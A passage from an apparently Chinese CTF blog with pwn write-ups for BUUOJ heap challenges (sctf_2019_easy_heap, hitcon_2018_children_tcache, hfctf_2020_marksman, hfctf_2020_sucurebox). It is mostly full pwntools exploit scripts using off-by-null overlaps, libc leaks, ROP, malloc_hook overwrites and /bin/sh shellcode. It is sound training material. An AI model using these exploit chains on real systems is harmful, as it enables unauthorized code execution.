class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size?&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content?&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index ?\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index ?&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;what is your name?&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;sc&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-comment">#1 </span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;c&#x27;</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>) <span class="hljs-comment">#3</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span> <br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br><br><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">2</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x90</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>flag_addr = heap_base + <span class="hljs-number">0x110</span><br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + libc_base<br>pop_rdx = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>))) + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000417</span> + libc_base <br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br><br>add(<span class="hljs-number">0xb0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">18</span> + p64(heap_base + <span class="hljs-number">0x240</span>) + p64(ret)) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0xf8</span>,rop) <span class="hljs-comment">#5</span><br><span class="hljs-comment">#add(3,)</span><br>add(<span class="hljs-number">0x60</span>,p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(setcontext))<br>free(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0xb0</span>))<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="七十四、sctf-2019-easy-heap"><a href="#七十四、sctf-2019-easy-heap" class="headerlink" title="七十四、sctf_2019_easy_heap"></a>七十四、sctf_2019_easy_heap</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20211024164932819.png"><span class="image-caption">image-20211024164932819</span></p>
<p>漏洞点在于输入函数，存在offbynull，因此构造overlap</p>
<p>这题问题点在于构造overlap时，要进行合并的头堆块和尾堆块中间要夹着至少两个堆块（一个堆块会报错，刚开始我就一直卡着）。</p>
<p>然后对于libc的利用，因为unsorted bin上的libc地址距离malloc_hook地址很接近，只相差一个字节的内容，所以在制造了overlap后，申请堆块时注意，让被覆盖的fd指针上被写入libc地址，然后修改一字节内容即可。这样程序即是没有打印函数也无关紧要。</p>
<p>然后只要把堆块申请到mmap的地址上，然后把地址写入hook函数执行shellcode即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./sctf_2019_easy_heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27234</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Address 0x&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;Mmap: 0x&quot;</span>)<br>shell_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;shell_addr==&gt;0x%x&quot;</span> %shell_addr)<br>add(<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">0x4f0</span>)<br>add(<span class="hljs-number">0x18</span>)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x470</span>))<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x440</span>)<br>add(<span class="hljs-number">0x510</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x418</span> + p64(<span class="hljs-number">0x31</span>) + p64(shell_addr) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x28</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f  # 0x68732f6e69622f --&gt; hs/nib/  little endian</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    push rsp </span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    xor esi, esi               # rsi低32位</span><br><span class="hljs-string">    xor edx, edx               # rdx低32位</span><br><span class="hljs-string">    push 0x3b</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span>   )<br>edit(<span class="hljs-number">3</span>,shellcode + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;\x30&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">6</span>,p64(shell_addr) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x50</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="七十五、hitcon-2018-children-tcache"><a href="#七十五、hitcon-2018-children-tcache" class="headerlink" title="七十五、hitcon_2018_children_tcache"></a>七十五、hitcon_2018_children_tcache</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20211030181121619.png"><span class="image-caption">image-20211030181121619</span></p>
<p>常规checksec，保护全开</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211030181304288.png"><span class="image-caption">image-20211030181304288</span></p>
<p>漏洞点在于申请功能里面的strcpy这个函数，把你内容复制过去时会自动在末尾加一个’\x00’，所以当填满数据时，造成了offbynull漏洞。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211030181437290.png"><span class="image-caption">image-20211030181437290</span></p>
<p>这题特殊在释放函数会先对堆块的内容填入你<code>写入 size </code>的大小的垃圾数据，这个是你写入的size，这个很重要</p>
<p>其次就是没有写功能，所以只能依赖于申请功能里面附带的写数据来实现写入。</p>
<p>利用：</p>
<p>​    因为是offbynull漏洞，那目的一定是要制造出堆块重叠的。泄露libc因为有着strcpy函数，所以会多个’\x00’截断问题，所以只能在制造出overlap时才能打印出libc地址。那么所有重心都在制造出overlap</p>
<p>这边要注意，因为是glibc-2.27版本，所以堆块是要申请入0x4f8这样的，不会被放入tcache里面，才能实现合并。然后就是pre_size位置的填充一定要把那个八个字节的内容都要填满才行</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211030181946581.png"><span class="image-caption">image-20211030181946581</span></p>
<p>这样写，才能溢出一个’\x00’</p>
<p>然后我们就要去修正前面为了占位置的垃圾的数据了，这边我用的是a这个字符。清空是用了前面强调的delete填充垃圾数据是根据我们申请堆块时候写进去的size填充的，所以如果我们依次减少一个字节申请数量，然后再填满我们申请的大小，借用strcpy溢出的’\x00’来逐个去清空前面为了修改pre_inuse位而填入的a</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211030182245802.png"><span class="image-caption">image-20211030182245802</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211030182305126.png"><span class="image-caption">image-20211030182305126</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211030182359347.png"><span class="image-caption">image-20211030182359347</span></p>
<p>最后就能全部清零，成功伪造出pre_inuse，后面就是常规的构造overlap，最后把one_gadget写入malloc_hook里面getshell</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211030182527290.png"><span class="image-caption">image-20211030182527290</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./HITCON_2018_children_tcache&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25931</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)<br>    p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">&#x27;d&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>j = <span class="hljs-number">6</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0x28</span>-i,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span> + <span class="hljs-string">&#x27;\x60\x05&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*j)<br>    j = j - <span class="hljs-number">1</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x10a38c</span><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(mlh))<br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x28</span>,p64(ogg))<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x60</span>))<br><span class="hljs-comment">#debug()</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h3 id="七十六、hfctf-2020-marksman"><a href="#七十六、hfctf-2020-marksman" class="headerlink" title="七十六、hfctf_2020_marksman"></a>七十六、hfctf_2020_marksman</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20211104212411070.png"><span class="image-caption">image-20211104212411070</span></p>
<p>64位，保护全开，而且运行了一下，题目给了小礼物：libc地址</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211106145934254.png"><span class="image-caption">image-20211106145934254</span></p>
<p>而且程序很简单，可以看见，v6输入一个值，显然是输入一个地址的，然后底下可以修改三个字节内容，所以要getshell肯定是要想办法利用这三个字节把某个会被调用的libc内容修改为one_gadget，但是要想修改内容就要先通过check</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211106145902768.png"><span class="image-caption">image-20211106145902768</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211106150044423.png"><span class="image-caption">image-20211106150044423</span></p>
<p>check里面不允许写入一些字节，可以发现这些字节就是one_gadget的字节，也就是说是不允许直接写入这些one_gadget的。所以要转换一下思路</p>
<h4 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h4><p>利用IDA查看这些one_gadget，去看看这些地址的上方有没有其他不会影响的操作，然后把地址修改为该地址，最终也会执行到one_gadget</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211106150346116.png"><span class="image-caption">image-20211106150346116</span></p>
<p>比如这个one_gadget，在上面是一个执行close的函数指令，显然是不会影响到one_gadget的，所以可以把这个地址作为修改地址，我们可以修改exit的__rtld_lock_unlock_recursive，这也是一个类似hook函数的东西，exit退出时会被执行到。所以可以修改这里的内容</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211106153902758.png"><span class="image-caption">image-20211106153902758</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211106160251870.png"><span class="image-caption">image-20211106160251870</span></p>
<p>另外值得注意的点(我踩坑了)：这边的v6是用atol转换出来的，所以输入时直接用str转为字符串输入，如果使用p64打包，会变成16进制数，atol会识别不了，直接返回0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hfctf_2020_marksman&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,28590)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x809c0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0x10a387</span><br>log.info(<span class="hljs-string">&quot;ogg==&gt;0x%x&quot;</span> %ogg)<br>exit_hook = libc_base + <span class="hljs-number">0x81cf60</span><br>p.sendlineafter(<span class="hljs-string">&quot;shoot!shoot!\n&quot;</span>,<span class="hljs-built_in">str</span>(exit_hook))<br>p.sendlineafter(<span class="hljs-string">&quot;biang!\n&quot;</span>, p8(ogg&amp;<span class="hljs-number">0xFF</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;biang!\n&quot;</span>, p8((ogg&amp;<span class="hljs-number">0xFF00</span>)&gt;&gt;<span class="hljs-number">8</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;biang!\n&quot;</span>, p8((ogg&amp;<span class="hljs-number">0xFF0000</span>)&gt;&gt;<span class="hljs-number">16</span>))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h4 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h4><p><img src="/2021/04/07/2021-04-07-buu03/image-20211106154641512.png"><span class="image-caption">image-20211106154641512</span></p>
<p>禁用的只是常见的one_gadget，可以增加参数<code>--level 2</code>查看更多的one_gadget，但是约束更多，而其中上图圈出的也是可以getshell的one_gadget</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211106161834320.png"><span class="image-caption">image-20211106161834320</span></p>
<p>另一个可以修改为one_gadget的地方就在不断追踪dlopen这个函数时，可以发现，在_dlerror_run+96的地址调用_dl_catch_error@plt</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211106162708556.png"><span class="image-caption">image-20211106162708556</span>    </p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211106163050236.png"><span class="image-caption">image-20211106163050236</span></p>
<p>把这里的got表内容修改为one_gadget即可，没具体写exp，但是过程已经详细说明</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20211106163226205.png"><span class="image-caption">image-20211106163226205</span></p>
<p>当然前提是RELRO没开全，允许修改libc里面的got表</p>
<h3 id="七十七、hfctf-2020-sucurebox"><a href="#七十七、hfctf-2020-sucurebox" class="headerlink" title="七十七、hfctf_2020_sucurebox"></a>七十七、hfctf_2020_sucurebox</h3><p>漏洞在 size 限制时，可以存在整数溢出，可以让 size 成为一个大数。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20230201184708105.png"><span class="image-caption">image-20230201184708105</span></p>
<p>配合写的函数，可以达到任意写的地步。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20230201195052771.png"><span class="image-caption">image-20230201195052771</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./hfctf_2020_sucurebox&#x27;</span>)<br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>    <span class="hljs-comment">#p = process(&#x27;./&#x27;)</span><br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>    port = <span class="hljs-number">26001</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choose</span>(<span class="hljs-params">choice</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;5.Exit\n&quot;</span>, <span class="hljs-built_in">str</span>(choice).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    choose(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Size:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>	<br>	<br><span 